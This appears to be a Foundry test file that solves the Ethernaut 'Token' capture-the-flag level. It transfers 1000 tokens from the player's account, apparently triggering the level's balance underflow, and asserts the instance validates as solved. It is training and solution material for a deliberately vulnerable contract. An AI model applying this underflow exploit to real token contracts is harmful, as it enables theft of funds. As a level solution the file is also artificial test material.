pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "src/core/Ethernaut.sol";
import "src/levels/05Token/Token.sol";
import "src/levels/05Token/TokenFactory.sol";

contract TestToken is Test{
    Ethernaut ethernaut = new Ethernaut();
    address myEoaAddress = 0xB5Da00630Ca5fdE4d9cED2fcdA0C607cE198F159;
    address testRecipient = address(0x13);
    function setUp() public {
        vm.deal(myEoaAddress, 1000 ether);
    }

    function testToken() public{
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(myEoaAddress, myEoaAddress);
        address instanceAddress = ethernaut.createLevelInstance(tokenFactory);
        Token instance = Token(payable(instanceAddress));
        emit log_named_uint("Owner initial balance:", instance.balanceOf(address(tokenFactory)));
        emit log_named_uint("Player initial balance:", instance.balanceOf(myEoaAddress));
        instance.transfer(testRecipient, 1000);
        emit log_named_uint("My mone after transfer:", instance.balanceOf(myEoaAddress));
        emit log_named_uint("Test account mone after transfer:", instance.balanceOf(testRecipient));

        vm.stopPrank();
        bool result = tokenFactory.validateInstance(payable(instanceAddress), testRecipient);
        assertTrue(result);

    }

}